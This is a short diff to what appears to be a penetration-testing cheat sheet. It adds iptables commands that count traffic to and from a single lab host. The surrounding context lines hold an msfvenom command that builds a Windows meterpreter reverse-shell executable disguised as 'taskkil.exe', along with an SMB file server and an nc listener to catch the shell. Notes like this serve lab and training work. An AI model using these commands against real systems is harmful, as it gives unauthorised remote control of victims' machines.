@@ -171,6 +171,14 @@ python -m SimpleHTTPServer 80
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=51251 -f exe -o taskkil.exe
 impacket-smbserver files `pwd`
 rlwrap nc -lvnp 51251
+
+#monitor traffic to and from single host
+iptables -I INPUT 1 -s 10.11.1.227 -j ACCEPT
+iptables -I OUTPUT 1 -d 10.11.1.227 -j ACCEPT
+# list consumption
+iptables -vn -L
+# Clear consumption
+iptables -Z
 ```
 
 
